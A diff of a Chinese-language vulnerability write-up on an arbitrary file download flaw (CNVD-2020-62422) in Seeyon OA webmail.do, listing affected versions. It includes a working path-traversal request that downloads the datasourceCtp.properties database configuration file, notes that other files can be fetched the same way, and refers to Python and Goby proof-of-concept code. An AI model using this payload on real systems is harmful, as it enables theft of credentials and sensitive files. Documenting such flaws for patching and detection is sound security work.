@@ -14,7 +14,7 @@ source: "MrWQ/vulnerability-paper"
 
 致远 OA 存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息
 
-**二:  漏洞影响🐇**
+**二:  漏洞影响🐇**
 
 致远 OA A6-V5
 
@@ -22,9 +22,9 @@ source: "MrWQ/vulnerability-paper"
 
 致远 OA G6
 
-**三:  漏洞复现🐋**
+**三:  漏洞复现🐋**
 
-访问 url  http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties
+访问 url  http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties
 
 存在漏洞的 OA 系统将会下载 **datasourceCtp.properties** 配置文件
 
@@ -32,7 +32,7 @@ source: "MrWQ/vulnerability-paper"
 
 更改参数 filePath 可下载其他文件
 
- **四:  漏洞利用 POC🐋**
+ **四:  漏洞利用 POC🐋**
 
 ```
 import requests
@@ -76,7 +76,7 @@ Goby & POC
 ----------
 
 ```
-GOby POC 目录已经添加漏洞json文件，可以一键导入
+GOby POC 目录已经添加漏洞json文件，可以一键导入
 致远OA webmail.do任意文件下载 CNVD-2020-62422
 ```
 
